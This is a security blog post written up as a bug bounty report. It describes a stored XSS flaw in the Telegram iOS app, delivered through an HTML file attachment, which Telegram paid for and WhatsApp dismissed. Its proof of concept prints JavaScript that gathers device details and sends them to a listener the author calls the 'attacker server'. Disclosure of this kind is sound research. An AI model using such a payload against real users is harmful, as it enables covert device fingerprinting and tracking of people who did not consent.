<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" media="print" onload="this.onload=null;this.media='all';" id="ao_optimized_gfonts" href="https://fonts.googleapis.com/css?family=Oswald%3A400%2C300%2C700%7CAlegreya+Sans%3A400%2C400italic%2C700%2C700italic%7CDosis%3Ainherit%2C400&#038;subset=latin%2Clatin-ext&amp;display=swap">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="/xmlrpc.php">
<meta name="theme-color" content="#1a1a1a">
<link media="all" href="/wp-content/cache/autoptimize/css/autoptimize_3b05b7efe97d6722f572c298a31dfe97.css" rel="stylesheet">
<title>WRITE UP &#8211; TELEGRAM BUG BOUNTY &#8211; WHATSAPP N/A [&#8220;Blind&#8221; XSS Stored iOS in messengers twins, who really care about your security?] &#8211; @omespino</title>
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="//www.googletagmanager.com">
<link href="https://fonts.gstatic.com/" crossorigin="anonymous" rel="preconnect">
<link rel="alternate" type="application/rss+xml" title="@omespino &raquo; Feed" href="/feed/">
<link rel="alternate" type="application/rss+xml" title="@omespino &raquo; Comments Feed" href="/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="@omespino &raquo; WRITE UP &#8211; TELEGRAM BUG BOUNTY &#8211; WHATSAPP N/A [&#8220;Blind&#8221; XSS Stored iOS in messengers twins, who really care about your security?] Comments Feed" href="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/feed/">
<link rel="stylesheet" id="mm-compiled-options-mobmenu-css" href="/wp-content/cache/autoptimize/css/autoptimize_single_20b3cf9d88dd6d90b4e4a9a904cb8741.css" type="text/css" media="all"> <script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>  <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=UA-47561535-2" id="google_gtagjs-js" async></script> <link rel="https://api.w.org/" href="/wp-json/">
<link rel="alternate" type="application/json" href="/wp-json/wp/v2/posts/261">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml">
<meta name="generator" content="WordPress 5.9.3">
<link rel="canonical" href="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/">
<link rel="shortlink" href="/?p=261">
<link rel="alternate" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2Fwrite-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security%2F">
<link rel="alternate" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2Fwrite-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security%2F&#038;format=xml">
<meta name="generator" content="Site Kit by Google 1.72.0"> <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1119974224835012&ev=PageView&noscript=1"></noscript>
<link rel="icon" href="/wp-content/uploads/2020/12/cropped-dddd-32x32.png" sizes="32x32">
<link rel="icon" href="/wp-content/uploads/2020/12/cropped-dddd-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="/wp-content/uploads/2020/12/cropped-dddd-180x180.png">
<meta name="msapplication-TileImage" content="/wp-content/uploads/2020/12/cropped-dddd-270x270.png"> <script src="/wp-content/cache/autoptimize/js/autoptimize_eafcdd70e0cf994d53c6a65b41022ac5.js"></script>
</head>
<body class="post-template-default single single-post postid-261 single-format-standard custom-background mob-menu-slideout-over">
<div id="page" class="hfeed site"> <a class="skip-link screen-reader-text" href="#content">Skip to content</a><header id="masthead" class="site-header" role="banner"><div class="navigation-wrapper"><nav id="site-navigation" class="main-navigation" role="navigation"> <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Menu</button><div class="menu-menu-espanol-container"><ul id="menu-menu-espanol" class="menu"><li id="menu-item-1304" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1304"><a href="/es">BLOG EN ESPAÑOL</a></li></ul></div></nav></div>
<div class="site-branding">
<h1 class="site-title"><a href="/" rel="home">@omespino</a></h1>
<h2 class="site-description">just another security blog.</h2>
</div></header><div id="content" class="site-content"><div id="primary" class="content-area"><main id="main" class="site-main" role="main"><article id="post-261" class="post-261 post type-post status-publish format-standard hentry category-uncategorized-en"><header class="entry-header"><div class="entry-meta"> <span class="byline"> Written by <span class="author vcard"><a class="url fn n" href="/author/user-admin/">omespino</a></span></span><span class="posted-on"><a href="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/" rel="bookmark"><time class="entry-date published" datetime="2018-07-16T12:25:57-07:00">July 16, 2018</time><time class="updated" datetime="2022-01-07T17:30:15-07:00">January 7, 2022</time></a></span>
</div>
<h1 class="entry-title">WRITE UP &#8211; TELEGRAM BUG BOUNTY &#8211; WHATSAPP N/A [&#8220;Blind&#8221; XSS Stored iOS in messengers twins, who really care about your security?]</h1></header><div class="entry-wrapper">
<div class="entry-content">
<p><strong>Introduction:<br></strong>Hi everyone It&#8217;s been a while since my last post but I&#8217;m back, I want to tell you a short story about Telegram/Whatsapp bug bounty that is very great because this was <strong>my first Bitcoin bug bounty payment</strong>:</p>
<p class="has-text-align-center"><em>This blogpost appeared first in the book <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"></a></figure></div>
<p><strong><br><br>[Note] the vulnerability was exactly the same so [It was accepted by Telegram but marked as N/A by Whatsapp (Facebook Whitehat team) ],  I just going to describe the process once, also I called &#8220;Blind&#8221; XSS stored because I couldn&#8217;t get a popup alert, but the javascript code rendered anyway.</strong></p>
<p><strong>Title:</strong> Blind XSS Stored on Telegram app (iOS) via html file.<br><strong>Product / URL: ​</strong>Telegram iOS app</p>
<p><strong>Description and Impact​:</strong><br>​The attackers can store and render arbitrary HTML/Javascript code via HTML file in the background since Telegram iOS doesn&#8217;t sanitize any code in the webview inside the app.</p>
<p><strong>In this case the impact is:</strong><br>&#8211; The attacker can know when the user read the message and when was the last user online activity even if is &#8220;last seen&#8221; and &#8220;read receipts&#8221; are turned off.<br>&#8211; The attacker can fingerprint the user device with navigator object that contains interesting info from the user device, iOS version, iOS device, language<br>&#8211; The attacker can get the victim IP and at least know what is current user city location with any service online like https://www.elhacker.net/geolocalizacion.html</p>
<p><strong>POC:</strong></p>
<p>1.- &#8220;As attacker&#8221;: Login to your Telegram account in any client and upload a html file with the following content and send it via message (ggwp.htm file attached):</p>
<p>ggwp.html file content (transcript):</p>
<pre class="wp-block-code"><code>&lt;!-- script that load a firebug lite version to get the webview debuggin console inside the app --&gt;
&lt;script src='https://getfirebug.com/firebug-lite-debug.js'&gt;&lt;/script&gt;
&lt;script&gt;
// iterating the navigator object that contain interesting info from the user device, iOS version, iOS device, language
var nav = {};
for (var property in navigator) {
nav&#91;property] = navigator&#91;property];
}
// tracking when the user open the file with the date
var d = new Date();
var nav_formated = '&lt;pre&gt;&lt;h1&gt;'+ document.location + '&lt;/h1&gt;&lt;h2&gt;' + d + ','+ JSON.stringify(nav, null, 2) + '&lt;/h2&gt;&lt;pre&gt;';
// writting the results
document.write(nav_formated);
// send data to the 'attacker server'
send_response(nav_formated);
function send_response(response){
var o_req = new XMLHttpRequest();
o_req.open('POST','http://192.168.1.120:8090');
o_req.send(response);
}
&lt;/script&gt;</code></pre>
<p>2.- Run the &#8220;attacker server&#8221; and wait for the victim open the file (in my case was my own computer in my lan with the IP 192.168.1.120 and run the server with nc -lvvv 8090)</p>
<p>3.- &#8220;As victim&#8221;: open the file in Telegram iOS and see the results that the victim just sent to the &#8220;attacker sever&#8221;</p>
<p>&#8211; The document.location<br>&#8211; The navigator object</p>
<p>Note: Also you can notice that the Firebug lite debug console renders without any problem and is fully functional.</p>
<p>4.- &#8220;As attacker&#8221;: see the results caught in the &#8220;attacker sever&#8221;</p>
<figure class="wp-block-image"><a href="/wp-content/uploads/2018/07/telegram_iOS_blind_XSS_stored.jpg"><img src="/wp-content/uploads/2018/07/telegram_iOS_blind_XSS_stored.jpg" alt="" class="wp-image-269"></a></figure><p><strong>Environment:</strong><br>iPhone 6 &#8211; iOS v11.2.5.<br>iPhone 7 &#8211; iOS v11.2.6<br>Telegram iOS app Version 4.7.1<br>My personal account and the server was &#8220;hosted&#8221; in my own LAN.</p>
<p><strong>Tools:</strong> Any unix like terminal with​ netcat installed<br><strong>Is this bug public or known by third parties?​:</strong>&nbsp;No​</p>
<p><strong>Can I reproduce this issue every time?</strong> Yes<br><strong>How did I find this bug?</strong> Manually / Other</p>
<p><strong>Summarizing</strong>, this clearly demonstrates how these companies manage this kind of vulnerabilities, in the one hand Telegram demonstrates actually how they worry about the user fingerprinting and Facebook demonstrated that don&#8217;t care.</p>
<p>PS. here part of my conversation with Facebook whitehat team.</p>
<figure class="wp-block-image"><a href="/wp-content/uploads/2018/07/omespino_facebook_conversation.png"><img src="/wp-content/uploads/2018/07/omespino_facebook_conversation.png" alt="" class="wp-image-270"></a></figure><p><strong>Timeline:</strong><br>22 Mar 2018: Initial report (Both platforms)<br>26 Mar 2018: Telegram Security team member send me a response:</p>
<p>&#8220;Thank you very much for taking an interest in what we do and finding this issue. It will be fixed in the upcoming release. We would like to award you with a bounty of EUR **** for helping us identify it. I&#8217;m cc-ing ******* who will help you collect.&nbsp;&#8220;</p>
<p>26 Mar 2018: Facebook Security team member ask me for more details.<br>26 Mar 2018: I replied Facebook&nbsp;Security team with more details.<br>29 Mar 2018: Facebook Security team closed as N/A.<br>10 Apr 2018: I got the Bitcoin transfer from Telegram Security team.&nbsp;[Profit]<br>sometime in July 2018: Telegram iOS app fixed so I decided to make public this patched vulnerability.</p>
<p>well that’s it, share your thoughts, what do you think about how they handle that security issue? if you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.</p>
<div class="shared-counts-wrap after_content style-fancy">
<a href="https://www.facebook.com/sharer/sharer.php?u=/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/&amp;display=popup&amp;ref=plugin&amp;src=share_button" title="Share on Facebook" target="_blank" rel="nofollow noopener noreferrer" class="shared-counts-button facebook shared-counts-no-count" data-postid="261" data-social-network="Facebook" data-social-action="Share" data-social-target="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="18.8125" height="32" viewbox="0 0 602 1024"><path d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z"></path></svg></span><span class="shared-counts-label">Facebook</span></span></a><a href="https://twitter.com/share?url=/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/&amp;text=WRITE%20UP%20%E2%80%93%20TELEGRAM%20BUG%20BOUNTY%20%E2%80%93%20WHATSAPP%20N%2FA%20%5B%E2%80%9CBlind%E2%80%9D%20XSS%20Stored%20iOS%20in%20messengers%20twins%2C%20who%20really%20care%20about%20your%20security%3F%5D" title="Share on Twitter" target="_blank" rel="nofollow noopener noreferrer" class="shared-counts-button twitter shared-counts-no-count" data-postid="261" data-social-network="Twitter" data-social-action="Tweet" data-social-target="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="29.71875" height="32" viewbox="0 0 951 1024"><path d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z"></path></svg></span><span class="shared-counts-label">Tweet</span></span></a><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/" title="Share on LinkedIn" target="_blank" rel="nofollow noopener noreferrer" class="shared-counts-button linkedin shared-counts-no-count" data-postid="261" data-social-network="LinkedIn" data-social-action="Share" data-social-target="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="27.4375" height="32" viewbox="0 0 878 1024"><path d="M199.429 357.143v566.286h-188.571v-566.286h188.571zM211.429 182.286q0.571 41.714-28.857 69.714t-77.429 28h-1.143q-46.857 0-75.429-28t-28.571-69.714q0-42.286 29.429-70t76.857-27.714 76 27.714 29.143 70zM877.714 598.857v324.571h-188v-302.857q0-60-23.143-94t-72.286-34q-36 0-60.286 19.714t-36.286 48.857q-6.286 17.143-6.286 46.286v316h-188q1.143-228 1.143-369.714t-0.571-169.143l-0.571-27.429h188v82.286h-1.143q11.429-18.286 23.429-32t32.286-29.714 49.714-24.857 65.429-8.857q97.714 0 157.143 64.857t59.429 190z"></path></svg></span><span class="shared-counts-label">LinkedIn</span></span></a><span class="shared-counts-button included_total" data-postid="261" data-social-target="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="27.4375" height="32" viewbox="0 0 878 1024"><path d="M694.857 585.143q76 0 129.429 53.429t53.429 129.429-53.429 129.429-129.429 53.429-129.429-53.429-53.429-129.429q0-6.857 1.143-19.429l-205.714-102.857q-52.571 49.143-124.571 49.143-76 0-129.429-53.429t-53.429-129.429 53.429-129.429 129.429-53.429q72 0 124.571 49.143l205.714-102.857q-1.143-12.571-1.143-19.429 0-76 53.429-129.429t129.429-53.429 129.429 53.429 53.429 129.429-53.429 129.429-129.429 53.429q-72 0-124.571-49.143l-205.714 102.857q1.143 12.571 1.143 19.429t-1.143 19.429l205.714 102.857q52.571-49.143 124.571-49.143z"></path></svg></span><span class="shared-counts-label">Shares</span></span><span class="shared-counts-count">13</span></span>
</div>
</div>
<footer class="entry-footer"></footer><div id="comments" class="comments-area"><div id="respond" class="comment-respond">
<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/#respond" style="display:none;">Cancel reply</a></small>
</h3>
<form action="/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message" aria-hidden="true">Required fields are marked <span class="required" aria-hidden="true">*</span></span></p>
<p class="comment-form-comment"><label for="comment">Comment <span class="required" aria-hidden="true">*</span></label><textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p>
<p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245"></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes"></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200"></p> <input type="text" name="leLQY" value="" style="display: none !important;"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="261" id="comment_post_ID"> <input type="hidden" name="comment_parent" id="comment_parent" value="0"></p>
</form>
</div></div>
</div>
<div class="sidebar"></div></article><nav class="navigation post-navigation" aria-label="Posts"><h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links">
<div class="nav-previous"><a href="/write-up-twitter-bug-bounty-my-1st-bugbounty-poodle-sslv3-bug-on-multiple-twitter-smtp-servers/" rel="prev">Previous Post <span class="screen-reader-text">WRITE UP – TWITTER BUG BOUNTY [Report of my 1st bugbounty]: &#8220;POODLE SSLv3 bug on multiple twitter smtp servers&#8221;</span></a></div>
<div class="nav-next"><a href="/write-up-lovestory-from-closed-as-informative-to-xx00-usd-in-yahoo-ios-mail-app/" rel="next">Next Post <span class="screen-reader-text">WRITE UP – LOVE STORY, FROM CLOSED AS INFORMATIVE TO $3,500 USD, XSS STORED IN YAHOO! IOS MAIL APP</span></a></div>
</div></nav></main></div></div>
<footer id="colophon" class="site-footer" role="contentinfo"><div class="site-info"></div></footer>
</div>
<div class="mobmenu-overlay"></div>
<div class="mob-menu-header-holder mobmenu" data-menu-display="mob-menu-slideout-over" data-open-icon="down-open" data-close-icon="up-open">
<div class="mobmenul-container"><a href="#" class="mobmenu-left-bt mobmenu-trigger-action" data-panel-target="mobmenu-left-panel" aria-label="Left Menu Button"><i class="mob-icon-menu mob-menu-icon"></i><i class="mob-icon-cancel-1 mob-cancel-button"></i></a></div>
<div class="mob-menu-logo-holder"><a href="/" class="headertext"><span>@OMESPINO</span></a></div>
<div class="mobmenur-container"></div>
</div>
<div class="mobmenu-left-alignment mobmenu-panel mobmenu-left-panel  "> <a href="#" class="mobmenu-left-bt" aria-label="Left Menu Button"><i class="mob-icon-cancel-1 mob-cancel-button"></i></a><div class="mobmenu-content"><div class="menu-menu-espanol-container"><ul id="mobmenuleft" role="menubar" aria-label="Main navigation for mobile devices"><li role="none" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1304"><a href="/es" role="menuitem" class="">BLOG EN ESPAÑOL</a></li></ul></div></div>
<div class="mob-menu-left-bg-holder"></div>
</div>
</body>
</html>